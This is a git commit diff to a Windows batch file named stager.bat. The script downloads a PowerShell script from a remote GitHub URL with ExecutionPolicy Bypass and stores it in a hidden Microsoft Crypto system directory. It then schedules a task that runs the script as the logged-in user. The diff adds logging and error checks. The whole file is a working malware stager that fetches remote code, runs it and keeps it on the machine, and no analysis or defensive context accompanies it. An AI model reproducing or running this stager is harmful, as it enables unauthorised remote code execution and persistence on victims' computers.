a1b5d80f10e4cf4304eeeb12b6d491e338f7a361
user10327 <152578203+user10327@users.noreply.github.com>
2024-04-20 00:17:14 -0600

    Add files via upload

--- stager.bat
+++ stager.bat
@@ -1,14 +1,18 @@
 @echo off
 setlocal
 
+echo Downloading PowerShell script...
 powershell -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/user10327/zebrah/main/v2.ps1 -OutFile C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1"
+if %errorlevel% neq 0 (
+    echo Failed to download prompt.ps1
+    exit /b %errorlevel%
+)
+echo prompt.ps1 downloaded
 
 :: Get current date and time
 set "CurrentTime=%TIME%"
-
 :: Ensure double digits in hours
 if "%CurrentTime:~0,1%"==" " set CurrentTime=0%CurrentTime:~1%
-
 :: Use current time directly for scheduling
 set "ScheduledTime=%CurrentTime:~0,5%"
 
@@ -21,10 +25,16 @@ set "ScriptPath=C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1"
 set "TaskName=start-prompt"
 set "UserName=%user%"
 
+echo last logged in user: %UserName%
+echo creating task...
 :: Schedule the task to run the PowerShell script at the current time
 schtasks /create /tn "%TaskName%" /tr "powershell.exe -ExecutionPolicy Bypass -File '%ScriptPath%'" /sc once /st "%ScheduledTime%" /ru "%UserName%" /rp /sd "%DATE%"
+if %errorlevel% neq 0 (
+    echo Failed to create task
+    exit /b %errorlevel%
+)
 
 echo Task has been scheduled to run at %ScheduledTime% on %DATE%.
-pause
 
 endlocal
+pause
